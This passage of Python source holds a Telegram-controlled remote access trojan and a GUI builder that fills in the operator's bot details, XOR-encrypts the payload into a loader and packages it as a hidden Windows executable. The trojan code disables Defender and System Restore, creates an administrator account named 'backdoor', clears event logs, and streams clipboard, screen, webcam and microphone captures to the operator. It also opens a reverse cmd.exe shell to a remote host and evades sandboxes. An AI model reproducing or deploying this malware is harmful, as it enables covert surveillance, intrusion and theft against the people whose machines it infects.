                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall") as key:
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, subkey_name) as subkey:
                                try:
                                    display = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    if display:
                                        software.append(display)
                                except:
                                    pass
                            i += 1
                        except:
                            break
            except:
                pass
            info.append(f"Installed software: {len(software)} entries (not listing all)")
            hotfixes = subprocess.run('wmic qfe list brief', shell=True, capture_output=True, text=True)
            if hotfixes.stdout:
                info.append(f"Hotfixes: {len(hotfixes.stdout.splitlines())} lines")
            return "\n".join(info)
        except Exception as e:
            return f"[Error: {str(e)}]"

    def clipboard_loop_start(self, args=None):
        if self.clipboard_loop_running:
            return "[Clipboard loop already running]"
        self.clipboard_loop_running = True
        self.clipboard_thread = threading.Thread(target=self._clipboard_loop, daemon=True)
        self.clipboard_thread.start()
        return "[Clipboard loop started (sends every 10s)]"

    def _clipboard_loop(self):
        last_content = ""
        while self.clipboard_loop_running:
            try:
                content = pyperclip.paste()
                if content and content != last_content:
                    last_content = content
                    self.send_message(f"[Clipboard update]\n{content[:2000]}")
            except:
                pass
            time.sleep(10)

    def disable_defender(self, args=None):
        try:
            key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Scan") as key:
                winreg.SetValueEx(key, "DisableRemovableDriveScanning", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "DisableScanningMappedNetworkDrives", 0, winreg.REG_DWORD, 1)
            subprocess.run('net stop WinDefend /y', shell=True, capture_output=True)
            subprocess.run('sc config WinDefend start= disabled', shell=True, capture_output=True)
            return "[Defender disabled (services stopped, reg keys set)]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def enable_rdp(self, args=None):
        try:
            key_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "UserAuthentication", 0, winreg.REG_DWORD, 0)
            subprocess.run('netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389', shell=True, capture_output=True)
            subprocess.run('net user backdoor P@ssw0rd! /add /y', shell=True, capture_output=True)
            subprocess.run('net localgroup Administrators backdoor /add', shell=True, capture_output=True)
            return "[RDP enabled, firewall opened, user 'backdoor' created with password 'P@ssw0rd!']"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def firewall_add(self, args):
        if not args:
            return "[Usage: firewall_add <port>]"
        port = args.strip()
        try:
            subprocess.run(f'netsh advfirewall firewall add rule name="RAT_{port}" dir=in action=allow protocol=TCP localport={port}', shell=True, capture_output=True)
            return f"[Firewall rule added for port {port}]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def eventlog_clear(self, args):
        logs = ["Security", "System", "Application"]
        if args:
            logs = [x.strip() for x in args.split(',')]
        output = []
        for log in logs:
            try:
                subprocess.run(f'wevtutil cl "{log}"', shell=True, capture_output=True)
                output.append(f"{log} cleared")
            except:
                output.append(f"{log} failed")
        return "[Event logs: " + ", ".join(output) + "]"

    def powershell(self, args):
        if not args:
            return "[Usage: powershell <command>]"
        try:
            result = subprocess.run(f'powershell -c "{args}"', shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout if result.stdout else "[No output]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def inject(self, args):
        return "[Injection not implemented in this demo. Use a proper tool.]"

    def screenshot_loop(self, args):
        if not args or not args.strip().isdigit():
            return "[Usage: screenshot_loop <interval_seconds>]"
        interval = int(args.strip())
        self.loop_running = True
        self.loop_thread = threading.Thread(target=self._screenshot_loop_worker, args=(interval,), daemon=True)
        self.loop_thread.start()
        return f"[Screenshot loop started (every {interval}s)]"

    def _screenshot_loop_worker(self, interval):
        while self.loop_running:
            try:
                img = ImageGrab.grab()
                temp = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                temp.close()
                img.save(temp.name)
                self.send_file(temp.name, caption="Loop Screenshot")
                os.unlink(temp.name)
                time.sleep(interval)
            except:
                time.sleep(interval)

    def webcam_loop(self, args):
        if not args or not args.strip().isdigit():
            return "[Usage: webcam_loop <interval_seconds>]"
        interval = int(args.strip())
        self.loop_running = True
        self.loop_thread = threading.Thread(target=self._webcam_loop_worker, args=(interval,), daemon=True)
        self.loop_thread.start()
        return f"[Webcam loop started (every {interval}s)]"

    def _webcam_loop_worker(self, interval):
        while self.loop_running:
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    temp = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
                    temp.close()
                    cv2.imwrite(temp.name, frame)
                    self.send_file(temp.name, caption="Loop Webcam")
                    os.unlink(temp.name)
                time.sleep(interval)
            except:
                time.sleep(interval)

    def mic_loop(self, args):
        if not args or not args.strip().isdigit():
            return "[Usage: mic_loop <interval_seconds>]"
        interval = int(args.strip())
        self.loop_running = True
        self.loop_thread = threading.Thread(target=self._mic_loop_worker, args=(interval,), daemon=True)
        self.loop_thread.start()
        return f"[Microphone loop started (every {interval}s)]"

    def _mic_loop_worker(self, interval):
        while self.loop_running:
            try:
                duration = 5
                sample_rate = 44100
                recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1, dtype='int16')
                sd.wait()
                temp = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
                temp.close()
                wavfile.write(temp.name, sample_rate, recording)
                self.send_file(temp.name, caption="Loop Audio")
                os.unlink(temp.name)
                time.sleep(interval)
            except:
                time.sleep(interval)

    def system_restore_disable(self, args=None):
        try:
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                winreg.SetValueEx(key, "DisableSR", 0, winreg.REG_DWORD, 1)
            subprocess.run('sc stop VSS /y', shell=True, capture_output=True)
            subprocess.run('sc config VSS start= disabled', shell=True, capture_output=True)
            return "[System Restore disabled (registry and VSS service stopped)]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def geolocate(self, args=None):
        try:
            r = requests.get('https://ipapi.co/json/', timeout=10)
            data = r.json()
            return f"IP: {data.get('ip')}\nCountry: {data.get('country_name')}\nCity: {data.get('city')}\nLat/Lon: {data.get('latitude')}, {data.get('longitude')}"
        except:
            return "[Geolocation failed]"

    def sysinfo(self, args=None):
        try:
            import platform
            info = []
            info.append(f"Hostname: {platform.node()}")
            info.append(f"OS: {platform.system()} {platform.release()}")
            info.append(f"Arch: {platform.machine()}")
            info.append(f"CPU: {psutil.cpu_percent()}%")
            info.append(f"Memory: {psutil.virtual_memory().percent}%")
            info.append(f"Disk: {psutil.disk_usage('C:\\').percent}%")
            return "\n".join(info)
        except Exception as e:
            return f"[Error: {str(e)}]"

    def reboot(self, args=None):
        subprocess.run('shutdown /r /t 5', shell=True)
        return "[Rebooting...]"

    def shutdown(self, args=None):
        subprocess.run('shutdown /s /t 5', shell=True)
        return "[Shutting down...]"

    def lock(self, args=None):
        ctypes.windll.user32.LockWorkStation()
        return "[Workstation locked]"

    def message(self, args):
        if not args or '|' not in args:
            return "[Usage: message <title>|<message>]"
        title, msg = args.split('|', 1)
        ctypes.windll.user32.MessageBoxW(0, msg, title, 0)
        return "[Message box shown]"

    def audio(self, args):
        if not args:
            return "[Usage: audio <file_path>]"
        try:
            winsound.PlaySound(args.strip(), winsound.SND_FILENAME)
            return "[Audio playing]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def screen_record(self, args):
        duration = 10
        if args and args.strip().isdigit():
            duration = int(args.strip())
        try:
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            temp = tempfile.NamedTemporaryFile(suffix='.avi', delete=False)
            temp.close()
            screen = ImageGrab.grab()
            width, height = screen.size
            out = cv2.VideoWriter(temp.name, fourcc, 10.0, (width, height))
            for _ in range(int(duration * 10)):
                img = ImageGrab.grab()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
                out.write(frame)
                time.sleep(0.1)
            out.release()
            self.send_file(temp.name, caption=f"Screen record {duration}s")
            os.unlink(temp.name)
            return "[Screen recording sent]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def port_forward(self, args):
        parts = args.split()
        if len(parts) < 3:
            return "[Usage: port_forward <local_port> <remote_host> <remote_port>]"
        local_port, remote_host, remote_port = int(parts[0]), parts[1], int(parts[2])
        def forwarder():
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(('0.0.0.0', local_port))
            server.listen(5)
            while True:
                client, _ = server.accept()
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.connect((remote_host, remote_port))
                threading.Thread(target=self._forward, args=(client, remote), daemon=True).start()
                threading.Thread(target=self._forward, args=(remote, client), daemon=True).start()
        threading.Thread(target=forwarder, daemon=True).start()
        return f"[Port forward {local_port}->{remote_host}:{remote_port} started]"

    def _forward(self, src, dst):
        while True:
            try:
                data = src.recv(4096)
                if not data:
                    break
                dst.send(data)
            except:
                break
        src.close()
        dst.close()

    def reverse_proxy(self, args):
        parts = args.split()
        if len(parts) < 2:
            return "[Usage: reverse_proxy <remote_host> <remote_port>]"
        remote_host, remote_port = parts[0], int(parts[1])
        def relay():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((remote_host, remote_port))
                    proc = subprocess.Popen(
                        ["cmd.exe"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        shell=False
                    )
                    def reader(pipe, sock):
                        while True:
                            data = pipe.read(4096)
                            if not data:
                                break
                            sock.send(data)
                    def writer(sock, pipe):
                        while True:
                            data = sock.recv(4096)
                            if not data:
                                break
                            pipe.write(data)
                            pipe.flush()
                    t1 = threading.Thread(target=reader, args=(proc.stdout, s), daemon=True)
                    t2 = threading.Thread(target=writer, args=(s, proc.stdin), daemon=True)
                    t1.start()
                    t2.start()
                    t1.join()
                    t2.join()
                    s.close()
                    proc.kill()
                except:
                    pass
                time.sleep(5)
        threading.Thread(target=relay, daemon=True).start()
        return f"[Reverse proxy to {remote_host}:{remote_port} started]"

    def help_cmd(self, args=None):
        output = "=== COMMANDS ===\n"
        for cmd, desc in COMMAND_HELP.items():
            output += f"/{cmd} - {desc}\n"
        return output

    def exit(self, args=None):
        self.send_message("[RAT exiting...]")
        if self.service_stop_event:
            win32event.SetEvent(self.service_stop_event)
        else:
            sys.exit(0)

    # ---- WATCHDOG ----
    def watchdog(self):
        while self.alive:
            time.sleep(30)
            if time.time() - self.last_heartbeat > 60:
                self.send_message("[WATCHDOG] Main loop unresponsive, restarting...")
                if self.service_stop_event:
                    win32event.SetEvent(self.service_stop_event)
                else:
                    sys.exit(1)
                break

    # ---- MAIN LOOP ----
    def run(self, stop_event=None):
        self.service_stop_event = stop_event

        lockfile = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Caches\\rat.lock")
        first_run = not os.path.exists(lockfile)
        if first_run:
            try:
                os.makedirs(os.path.dirname(lockfile), exist_ok=True)
                with open(lockfile, 'w') as f:
                    f.write(str(time.time()))
            except:
                pass

        if first_run:
            if is_debugger_present() or is_sandbox():
                while True:
                    time.sleep(60)
                return
            hide_console()
            install_persistence()
            self.send_message("[RAT started]")
        else:
            hide_console()

        self.alive = True
        self.watchdog_thread = threading.Thread(target=self.watchdog, daemon=True)
        self.watchdog_thread.start()

        while True:
            if stop_event and win32event.WaitForSingleObject(stop_event, 0) == win32event.WAIT_OBJECT_0:
                break
            try:
                updates = self.get_updates()
                for update in updates:
                    if 'message' in update and 'text' in update['message']:
                        if update['message']['from']['id'] != self.authorized_id:
                            continue
                        text = update['message']['text'].strip()
                        if text.startswith('/'):
                            parts = text[1:].split(' ', 1)
                            cmd = parts[0].lower()
                            args = parts[1] if len(parts) > 1 else ''
                            if cmd in self.commands:
                                response = self.commands[cmd](args)
                                self.send_message(response)
                            else:
                                self.send_message(f"[Unknown command: {cmd}]")
                self.last_heartbeat = time.time()
                sleep_time = 2 + random.uniform(0, 2.0)
                time.sleep(sleep_time)
            except Exception as e:
                self.send_message(f"[Loop error: {str(e)}]")
                time.sleep(2 + random.uniform(0, 2.0))

# ---- WINDOWS SERVICE WRAPPER ----
class Service(win32serviceutil.ServiceFramework):
    _svc_name_ = SERVICE_NAME
    _svc_display_name_ = SERVICE_DISPLAY_NAME
    _svc_description_ = "Provides core system maintenance."

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        rat = TelegramRAT()
        rat.run(stop_event=self.hWaitStop)

def main():
    if len(sys.argv) == 1:
        if os.environ.get('RAT_STEALTH', '0') == '1':
            if is_sandbox():
                time.sleep(3600)
                return
            if not create_mutex():
                return
            time.sleep(random.randint(30, 300))
        else:
            if is_sandbox():
                time.sleep(3600)
                return
            if not create_mutex():
                return
        rat = TelegramRAT()
        rat.run()
    else:
        win32serviceutil.HandleCommandLine(Service)

if __name__ == '__main__':
    main()
'''


# ----------------------------------------------------------------------
# BUILDER GUI – final version with all hidden imports
# ----------------------------------------------------------------------
class StealthBuilderApp:
    def __init__(self, root):
        self.root = root
        root.title("Stealth RAT Builder (Full)")
        root.geometry("650x550")

        self.token_var = tk.StringVar()
        self.chat_var = tk.StringVar()
        self.user_var = tk.StringVar()
        self.output_name = tk.StringVar(value="StealthRAT")

        ttk.Label(root, text="Bot Token:").grid(row=0, column=0, pady=5, padx=10, sticky='w')
        ttk.Entry(root, textvariable=self.token_var, width=50).grid(row=0, column=1, pady=5, padx=10)

        ttk.Label(root, text="Chat ID:").grid(row=1, column=0, pady=5, padx=10, sticky='w')
        ttk.Entry(root, textvariable=self.chat_var, width=50).grid(row=1, column=1, pady=5, padx=10)

        ttk.Label(root, text="Your User ID:").grid(row=2, column=0, pady=5, padx=10, sticky='w')
        ttk.Entry(root, textvariable=self.user_var, width=50).grid(row=2, column=1, pady=5, padx=10)

        ttk.Label(root, text="Output Name (no extension):").grid(row=3, column=0, pady=5, padx=10, sticky='w')
        ttk.Entry(root, textvariable=self.output_name, width=30).grid(row=3, column=1, pady=5, padx=10, sticky='w')

        self.build_btn = ttk.Button(root, text="Build Stealth RAT", command=self.build)
        self.build_btn.grid(row=4, column=0, columnspan=2, pady=15)

        self.log_text = scrolledtext.ScrolledText(root, height=15, width=80, state='disabled')
        self.log_text.grid(row=5, column=0, columnspan=2, pady=5, padx=10)

    def log(self, msg):
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, msg + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state='disabled')
        self.root.update()

    def build(self):
        token = self.token_var.get().strip()
        chat = self.chat_var.get().strip()
        user = self.user_var.get().strip()
        if not token or not chat or not user:
            messagebox.showerror("Error", "All fields required.")
            return
        try:
            int(user)
        except:
            messagebox.showerror("Error", "User ID must be integer.")
            return
        self.build_btn.config(state='disabled')
        threading.Thread(target=self._build, args=(token, chat, user), daemon=True).start()

    def _build(self, token, chat, user):
        try:
            self.log("Reading RAT template...")
            script = RAT_TEMPLATE.replace("__BOT_TOKEN__", token)
            script = script.replace("__CHAT_ID__", chat)
            script = script.replace("__AUTHORIZED_ID__", user)

            # Encrypt as UTF-8 bytes
            script_bytes = script.encode('utf-8')
            key = random.randint(1, 255)
            encrypted = bytes([b ^ key for b in script_bytes])
            enc_hex = encrypted.hex()
            self.log(f"Encrypted with key: {key}")

            # Loader with proper exec context
            loader = f'''
import sys, os, time, base64, random, ctypes

encrypted_hex = "{enc_hex}"
key = {key}
encrypted = bytes.fromhex(encrypted_hex)
decrypted = bytearray()
for b in encrypted:
    decrypted.append(b ^ key)
script = decrypted.decode('utf-8', errors='ignore')

if getattr(sys, 'frozen', False):
    __file__ = sys.executable
else:
    __file__ = __file__

sys.path.insert(0, os.path.dirname(__file__))

def is_sandbox():
    try:
        import psutil
        disk = psutil.disk_usage('/')
        if disk.total < 60 * 1024**3:
            return True
    except:
        pass
    return False

if is_sandbox():
    time.sleep(120)
else:
    time.sleep(10)

exec(script, globals())
'''
            loader_path = os.path.join(tempfile.gettempdir(), "loader.py")
            with open(loader_path, 'w', encoding='utf-8') as f:
                f.write(loader)

            out_name = self.output_name.get().strip() or "StealthRAT"
            if sys.platform == "win32":
                out_name += ".exe"

            self.log("Running PyInstaller...")
            build_dir = tempfile.mkdtemp()
            try:
                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile", "--noconsole",
                    "--hidden-import", "sqlite3",
                    "--hidden-import", "win32api",
                    "--hidden-import", "win32con",
                    "--hidden-import", "win32security",
                    "--hidden-import", "win32file",
                    "--hidden-import", "win32process",
                    "--hidden-import", "win32gui",
                    "--hidden-import", "win32ui",
                    "--hidden-import", "win32serviceutil",
                    "--hidden-import", "win32service",
                    "--hidden-import", "win32event",
                    "--hidden-import", "servicemanager",
                    "--hidden-import", "pywintypes",
                    "--hidden-import", "pythoncom",
                    "--hidden-import", "winsound",           # <-- ADDED
                    "--hidden-import", "winreg",            # built-in, but explicit
                    "--hidden-import", "ctypes",            # built-in
                    "--hidden-import", "json",              # built-in
                    "--hidden-import", "base64",            # built-in
                    "--hidden-import", "requests",
                    "--hidden-import", "psutil",
                    "--hidden-import", "PIL",
                    "--hidden-import", "PIL.ImageGrab",
                    "--hidden-import", "cv2",
                    "--hidden-import", "numpy",
                    "--hidden-import", "sounddevice",
                    "--hidden-import", "scipy",
                    "--hidden-import", "scipy.io.wavfile",
                    "--hidden-import", "pyperclip",
                    "--hidden-import", "pynput",
                    "--hidden-import", "pynput.keyboard",
                    "--hidden-import", "cryptography",
                    "--hidden-import", "cryptography.hazmat.primitives.ciphers.aead",
                    "--name", out_name.replace(".exe", ""),
                    loader_path
                ]
                proc = subprocess.Popen(cmd, cwd=build_dir,
                                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, bufsize=1)
                for line in proc.stdout:
                    self.log(f"  {line.strip()}")
                proc.wait()
                if proc.returncode != 0:
                    self.log("Build failed.")
                    self.build_btn.config(state='normal')
                    return

                exe_src = os.path.join(build_dir, "dist", out_name)
                if not os.path.exists(exe_src):
                    self.log("Output not found.")
                    self.build_btn.config(state='normal')
                    return

                save_path = filedialog.asksaveasfilename(
                    defaultextension=".exe" if sys.platform == "win32" else "",
                    filetypes=[("Executable", "*" + (".exe" if sys.platform == "win32" else ""))],
                    initialfile=out_name
                )
                if save_path:
                    shutil.copy2(exe_src, save_path)
                    self.log(f"Saved: {save_path}")
                    messagebox.showinfo("Success", f"Stealth RAT built!\nSaved to: {save_path}")
                else:
                    self.log("Save cancelled.")
            finally:
                shutil.rmtree(build_dir, ignore_errors=True)
        except Exception as e:
            self.log(f"Error: {str(e)}")
        finally:
            self.build_btn.config(state='normal')


if __name__ == "__main__":
    root = tk.Tk()
    app = StealthBuilderApp(root)
    root.mainloop()
